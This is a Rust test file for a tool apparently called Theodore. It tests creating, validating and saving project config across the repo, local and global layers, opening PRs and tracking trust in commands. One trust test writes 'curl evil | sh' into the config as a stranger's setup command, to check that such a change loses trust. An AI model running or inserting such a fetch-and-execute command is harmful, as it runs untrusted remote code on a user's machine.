//! Settings → Projects → Config (docs/config.md "Creating and saving the
//! config") against `Core` + `testkit` fakes: the draft from settings, the
//! live check, and saving to each layer — a host repo through a branch, a
//! push and one PR; a local folder's file (and commit); the local and
//! global files; trust for commands you wrote.

use std::path::Path;
use std::time::Duration;

use theodore_contract::{
    AddProjectRequest, CheckConfigRequest, ConfigLayer, ConfigProblemLevel, Ephemeral, Project,
    ProjectStatus, SaveConfigRequest, Setting, models,
};
use theodore_domain::{RepoRef, Sha};
use theodore_ports::{NewAction, Store, SyncActionCode};

use crate::testkit::{Fixtures, fixtures, sample_pr_detail};
use crate::{Core, Receivers};

async fn wait_until(mut cond: impl FnMut() -> bool) {
    for _ in 0..400 {
        if cond() {
            return;
        }
        tokio::time::sleep(Duration::from_millis(5)).await;
    }
    panic!("condition not met in time");
}

fn widget() -> RepoRef {
    RepoRef {
        host: theodore_domain::HostKind::Github,
        owner: "acme".into(),
        name: "widget".into(),
    }
}

/// A ready GitHub project whose default branch `main` is at `base000`.
async fn host_project(f: &Fixtures) -> (Core, Receivers, Project) {
    let (core, recv) = Core::start(f.deps());
    tokio::time::sleep(Duration::from_millis(30)).await;
    let project = Project {
        id: "github:acme/widget".into(),
        repo: widget(),
        path: None,
        status: ProjectStatus::Ready,
        error: None,
        default_branch: Some("main".into()),
        added_at: 0,
        description: None,
        private: false,
        pushed_at: None,
        last_fetched_at: Some(0),
    };
    core.apply(vec![NewAction {
        model: models::PROJECT.into(),
        model_id: project.id.clone(),
        action: SyncActionCode::I,
        data: Some(serde_json::to_value(&project).unwrap()),
    }])
    .await
    .unwrap();
    f.git.set_resolve("main", Sha::new("base000"));
    (core, recv, project)
}

/// A local folder project on a real (empty) directory, on `main`, clean.
async fn folder_project(f: &Fixtures, dir: &Path) -> (Core, Receivers, Project) {
    let (core, recv) = Core::start(f.deps());
    tokio::time::sleep(Duration::from_millis(30)).await;
    let project = core
        .add_project(AddProjectRequest {
            repo: None,
            path: Some(dir.display().to_string()),
        })
        .await
        .unwrap();
    wait_until(|| {
        f.store
            .get(models::PROJECT, &project.id)
            .unwrap()
            .is_some_and(|r| r.data["status"] == serde_json::json!("ready"))
    })
    .await;
    f.git.set_working_state(theodore_ports::WorkingState {
        current_branch: Some("main".into()),
        dirty_files: 0,
    });
    f.git.ship.lock().unwrap().dirty = Some(Vec::new());
    (core, recv, project)
}

fn put_user_setting(f: &Fixtures, key: &str, value: serde_json::Value) {
    let setting = Setting {
        key: key.into(),
        scope: "user".into(),
        value,
    };
    f.store
        .apply(vec![NewAction {
            model: models::SETTING.into(),
            model_id: format!("user:{key}"),
            action: SyncActionCode::I,
            data: Some(serde_json::to_value(&setting).unwrap()),
        }])
        .unwrap();
}

fn save(project: &Project, layer: ConfigLayer, text: &str) -> SaveConfigRequest {
    SaveConfigRequest {
        project: project.id.clone(),
        layer,
        text: text.into(),
        commit: false,
    }
}

/// The next `ConfigPr` event, skipping others.
async fn config_pr(recv: &mut Receivers) -> (u64, String) {
    for _ in 0..200 {
        match tokio::time::timeout(Duration::from_millis(20), recv.ephemeral.recv()).await {
            Ok(Ok(Ephemeral::ConfigPr { number, url, .. })) => return (number, url),
            Ok(Ok(_)) | Err(_) => {}
            Ok(Err(e)) => panic!("{e}"),
        }
    }
    panic!("no ConfigPr event");
}

// ── the draft ─────────────────────────────────────────────────────────────

#[tokio::test]
async fn a_draft_is_generated_from_the_projects_settings() {
    let f = fixtures();
    let (core, _recv, project) = host_project(&f).await;
    put_user_setting(&f, "agents.chat", serde_json::json!("codex"));
    put_user_setting(&f, "agents.skills", serde_json::json!(["claude", "gemini"]));
    // A personal file for this repo already sets one value.
    let local = crate::config::host_local_path(f.data_dir.path(), &widget());
    std::fs::create_dir_all(local.parent().unwrap()).unwrap();
    std::fs::write(&local, "spaces:\n  ports: 2\n").unwrap();

    let draft = core.config_draft(&project.id).await.unwrap();
    assert_eq!(draft.initial, Some(ConfigLayer::Local));
    assert!(
        crate::config::editor::validate(&draft.generated).is_empty(),
        "{}",
        draft.generated
    );
    let merged = crate::config::merge(&[crate::config::LayerText {
        layer: ConfigLayer::Repo,
        path: "/x".into(),
        legacy: false,
        text: Some(draft.generated.clone()),
    }]);
    assert_eq!(merged.value["review"]["agents"]["chat"], "codex");
    assert_eq!(
        merged.value["review"]["agents"]["skills"],
        serde_json::json!(["claude", "gemini"])
    );
    assert_eq!(merged.value["spaces"]["ports"], 2);
    assert!(
        draft
            .generated
            .contains("# Theodore config for acme/widget")
    );
    assert!(draft.generated.contains("  # hide: [\"gen/**\"]"));

    let repo = &draft.files[1];
    assert_eq!(repo.layer, ConfigLayer::Repo);
    assert_eq!(repo.text, None);
    assert_eq!(repo.save_to, "a PR from me/theodore-config into main");
    assert_eq!(draft.files[2].path, local.display().to_string());
    assert!(!draft.can_commit);
}

#[tokio::test]
async fn an_existing_repo_file_is_loaded_first() {
    let f = fixtures();
    let (core, _recv, project) = host_project(&f).await;
    f.git.put_file(
        &Sha::new("base000"),
        ".theodore/config.yaml",
        b"review:\n  hide: [\"gen/**\"]\n",
    );
    let draft = core.config_draft(&project.id).await.unwrap();
    assert_eq!(draft.initial, Some(ConfigLayer::Repo));
    assert_eq!(
        draft.files[1].text.as_deref(),
        Some("review:\n  hide: [\"gen/**\"]\n")
    );
    assert!(draft.files[1].path.contains("acme/widget@base000"));
}

// ── the live check ────────────────────────────────────────────────────────

#[tokio::test]
async fn a_check_reports_lines_and_previews_the_text_in_its_layer() {
    let f = fixtures();
    let (core, _recv, project) = host_project(&f).await;
    std::fs::write(
        f.data_dir.path().join("config.yaml"),
        "review:\n  skim: [\"**/*.snap\"]\n",
    )
    .unwrap();
    let check = core
        .check_config(CheckConfigRequest {
            project: project.id.clone(),
            layer: ConfigLayer::Repo,
            text: "review:\n  hide: [\"gen/**\"]\n  bogus: 1\nspaces:\n  ports: lots\n".into(),
        })
        .await
        .unwrap();
    let lines: Vec<_> = check.problems.iter().map(|p| (p.line, p.level)).collect();
    assert_eq!(
        lines,
        vec![
            (Some(3), ConfigProblemLevel::Warning),
            (Some(5), ConfigProblemLevel::Error)
        ]
    );
    let entry = |key: &str| {
        check
            .preview
            .entries
            .iter()
            .find(|e| e.key == key)
            .cloned()
            .unwrap_or_else(|| panic!("{key}: {:?}", check.preview.entries))
    };
    assert_eq!(entry("review.hide").layer, ConfigLayer::Repo);
    assert_eq!(entry("review.skim").layer, ConfigLayer::Global);
    assert_eq!(check.preview.unknown, vec!["review.bogus".to_string()]);

    // A syntax error: one problem with the parser's position.
    let check = core
        .check_config(CheckConfigRequest {
            project: project.id.clone(),
            layer: ConfigLayer::Local,
            text: "review:\n  hide: [\n".into(),
        })
        .await
        .unwrap();
    assert_eq!(check.problems.len(), 1);
    assert!(check.problems[0].line.is_some());
}

#[tokio::test]
async fn a_text_with_errors_is_not_saved() {
    let f = fixtures();
    let (core, _recv, project) = host_project(&f).await;
    let err = core
        .save_config(save(
            &project,
            ConfigLayer::Global,
            "spaces:\n  ports: lots\n",
        ))
        .await
        .unwrap_err();
    assert!(err.to_string().contains("line 2"), "{err}");
    assert!(!f.data_dir.path().join("config.yaml").exists());
}

// ── repo, host project ───────────────────────────────────────────────────

#[tokio::test]
async fn saving_to_a_host_repo_pushes_a_branch_and_opens_one_pr() {
    let f = fixtures();
    let (core, mut recv, project) = host_project(&f).await;
    let pr_ref = theodore_domain::PrRef {
        repo: widget(),
        number: 100,
        host_id: None,
    };
    let mut detail = sample_pr_detail(&pr_ref, &Sha::new("base000"), &Sha::new("cfg1"));
    detail.summary.url = "https://github.com/acme/widget/pull/100".into();
    f.host.push_get_pr(Ok(theodore_ports::Fetched::Modified {
        etag: None,
        value: detail,
    }));

    let text = "review:\n  hide: [\"gen/**\"]\n";
    let r = core
        .save_config(save(&project, ConfigLayer::Repo, text))
        .await
        .unwrap();
    assert_eq!(r.branch.as_deref(), Some("me/theodore-config"));
    assert_eq!(r.commit.as_deref(), Some("cfg1"));
    {
        let ship = f.git.ship.lock().unwrap();
        assert_eq!(ship.file_commits.len(), 1);
        let (parent, path, content, message, author) = &ship.file_commits[0];
        assert_eq!(
            parent,
            &Sha::new("base000"),
            "from the default branch's tip"
        );
        assert_eq!(path, ".theodore/config.yaml");
        assert_eq!(content, text);
        assert_eq!(message, "Add Theodore config");
        assert_eq!(author.email, "ada@example.com");
        assert_eq!(
            ship.pushes,
            vec![("me/theodore-config".to_string(), Sha::new("cfg1"))]
        );
    }
    let (number, url) = config_pr(&mut recv).await;
    assert_eq!(number, 100);
    assert_eq!(url, "https://github.com/acme/widget/pull/100");
    let calls = f.host.create_pr_calls.lock().unwrap().clone();
    assert_eq!(calls.len(), 1);
    assert_eq!(calls[0].1.head, "me/theodore-config");
    assert_eq!(calls[0].1.base, "main");
    assert_eq!(calls[0].1.title, "Add Theodore config");

    // A second save: one more commit on the same branch, same PR.
    let r = core
        .save_config(save(&project, ConfigLayer::Repo, "review:\n  hide: []\n"))
        .await
        .unwrap();
    assert_eq!(r.commit.as_deref(), Some("cfg2"));
    {
        let ship = f.git.ship.lock().unwrap();
        let (parent, _, _, message, _) = &ship.file_commits[1];
        assert_eq!(parent, &Sha::new("cfg1"), "on top of the pushed branch");
        assert_eq!(message, "Update Theodore config");
        assert_eq!(ship.pushes.len(), 2);
    }
    let (number, _) = config_pr(&mut recv).await;
    assert_eq!(number, 100);
    assert_eq!(
        f.host.create_pr_calls.lock().unwrap().len(),
        1,
        "found open, not opened again"
    );

    // Saving the same text again pushes nothing.
    let r = core
        .save_config(save(&project, ConfigLayer::Repo, "review:\n  hide: []\n"))
        .await
        .unwrap();
    assert_eq!(r.commit, None);
    assert_eq!(f.git.ship.lock().unwrap().pushes.len(), 2);
}

// ── repo, local folder ───────────────────────────────────────────────────

#[tokio::test]
async fn a_folder_repo_save_writes_the_file_and_commits_only_when_clean() {
    let f = fixtures();
    let dir = tempfile::tempdir().unwrap();
    let (core, _recv, project) = folder_project(&f, dir.path()).await;
    let file = dir.path().join(".theodore/config.yaml");

    // Another uncommitted change: "and commit" is off, and refused.
    f.git.ship.lock().unwrap().dirty = Some(vec!["src/main.rs".into()]);
    let draft = core.config_draft(&project.id).await.unwrap();
    assert!(!draft.can_commit);
    assert_eq!(
        draft.commit_note.as_deref(),
        Some("the folder has 1 other uncommitted change")
    );
    let err = core
        .save_config(SaveConfigRequest {
            commit: true,
            ..save(&project, ConfigLayer::Repo, "review: {}\n")
        })
        .await
        .unwrap_err();
    assert!(err.to_string().contains("uncommitted"), "{err}");
    assert!(!file.exists(), "nothing written");
    assert!(f.git.ship.lock().unwrap().folder_commits.is_empty());

    // Without committing: just the file.
    let r = core
        .save_config(save(&project, ConfigLayer::Repo, "review: {}\n"))
        .await
        .unwrap();
    assert_eq!(std::fs::read_to_string(&file).unwrap(), "review: {}\n");
    assert_eq!(r.commit, None);

    // Clean but for the config file itself: committed, that path only.
    f.git.ship.lock().unwrap().dirty = Some(vec![".theodore/config.yaml".into()]);
    assert!(core.config_draft(&project.id).await.unwrap().can_commit);
    let r = core
        .save_config(SaveConfigRequest {
            commit: true,
            ..save(&project, ConfigLayer::Repo, "review:\n  hide: [x]\n")
        })
        .await
        .unwrap();
    assert_eq!(r.commit.as_deref(), Some("folder1"));
    let commits = f.git.ship.lock().unwrap().folder_commits.clone();
    assert_eq!(commits.len(), 1);
    assert_eq!(commits[0].0, dir.path());
    assert_eq!(commits[0].1, vec![".theodore/config.yaml".to_string()]);
    assert_eq!(commits[0].2, "Update Theodore config");
}

// ── local and global ─────────────────────────────────────────────────────

#[tokio::test]
async fn a_local_save_writes_the_file_and_gitignores_it_once() {
    let f = fixtures();
    let dir = tempfile::tempdir().unwrap();
    std::fs::write(dir.path().join(".gitignore"), "node_modules").unwrap();
    let (core, _recv, project) = folder_project(&f, dir.path()).await;
    let r = core
        .save_config(save(&project, ConfigLayer::Local, "spaces:\n  ports: 1\n"))
        .await
        .unwrap();
    assert!(r.message.contains(".gitignore"), "{}", r.message);
    assert_eq!(
        std::fs::read_to_string(dir.path().join(".theodore/config.local.yaml")).unwrap(),
        "spaces:\n  ports: 1\n"
    );
    core.save_config(save(&project, ConfigLayer::Local, "spaces:\n  ports: 2\n"))
        .await
        .unwrap();
    assert_eq!(
        std::fs::read_to_string(dir.path().join(".gitignore")).unwrap(),
        "node_modules\n.theodore/config.local.yaml\n"
    );
}

#[tokio::test]
async fn a_host_projects_local_file_lives_in_the_data_dir() {
    let f = fixtures();
    let (core, _recv, project) = host_project(&f).await;
    let r = core
        .save_config(save(&project, ConfigLayer::Local, "review:\n  skim: [x]\n"))
        .await
        .unwrap();
    let path = f
        .data_dir
        .path()
        .join("projects/github/acme/widget/config.local.yaml");
    assert_eq!(r.path, path.display().to_string());
    assert_eq!(
        std::fs::read_to_string(&path).unwrap(),
        "review:\n  skim: [x]\n"
    );
    // It is a layer of the project's config from now on.
    let cfg = core.project_config(&project.id).await.unwrap();
    let skim = cfg.entries.iter().find(|e| e.key == "review.skim").unwrap();
    assert_eq!(skim.layer, ConfigLayer::Local);
}

#[tokio::test]
async fn a_global_save_writes_the_data_dirs_file() {
    let f = fixtures();
    let (core, _recv, project) = host_project(&f).await;
    core.save_config(save(
        &project,
        ConfigLayer::Global,
        "review:\n  hide: [x]\n",
    ))
    .await
    .unwrap();
    assert_eq!(
        std::fs::read_to_string(f.data_dir.path().join("config.yaml")).unwrap(),
        "review:\n  hide: [x]\n"
    );
}

// ── trust ─────────────────────────────────────────────────────────────────

#[tokio::test]
async fn commands_you_save_to_the_repo_are_allowed() {
    let f = fixtures();
    let dir = tempfile::tempdir().unwrap();
    let (core, _recv, project) = folder_project(&f, dir.path()).await;
    let r = core
        .save_config(save(
            &project,
            ConfigLayer::Repo,
            "spaces:\n  setup: pnpm install\n",
        ))
        .await
        .unwrap();
    assert!(r.trusted);
    let cfg = core.project_config(&project.id).await.unwrap();
    assert!(cfg.repo_commands.unwrap().trusted);

    // Someone else's change to the file asks again.
    std::fs::write(
        dir.path().join(".theodore/config.yaml"),
        "spaces:\n  setup: curl evil | sh\n",
    )
    .unwrap();
    let cfg = core.project_config(&project.id).await.unwrap();
    assert!(!cfg.repo_commands.unwrap().trusted);

    // A local save never allows commands it didn't write.
    let r = core
        .save_config(save(&project, ConfigLayer::Local, "spaces:\n  ports: 1\n"))
        .await
        .unwrap();
    assert!(!r.trusted);
    let cfg = core.project_config(&project.id).await.unwrap();
    assert!(!cfg.repo_commands.unwrap().trusted);
}

#[tokio::test]
async fn a_host_repo_save_keeps_the_merged_commands_allowed_until_its_pr_lands() {
    let f = fixtures();
    let (core, _recv, project) = host_project(&f).await;
    f.git.put_file(
        &Sha::new("base000"),
        ".theodore/config.yaml",
        b"spaces:\n  setup: make\n",
    );
    let before = core.project_config(&project.id).await.unwrap();
    let hash = before.repo_commands.unwrap().hash;
    core.store_trust(&project.id, &hash).await.unwrap();

    core.save_config(save(
        &project,
        ConfigLayer::Repo,
        "spaces:\n  setup: make\n  check: make test\n",
    ))
    .await
    .unwrap();
    // The default branch still has the old commands: still allowed.
    let cfg = core.project_config(&project.id).await.unwrap();
    assert!(cfg.repo_commands.unwrap().trusted);
    // Once the PR merges, the new set is allowed too.
    f.git.set_resolve("main", Sha::new("cfg1"));
    let cfg = core.project_config(&project.id).await.unwrap();
    let repo = cfg.repo_commands.unwrap();
    assert_eq!(repo.items.len(), 2);
    assert!(repo.trusted);
}
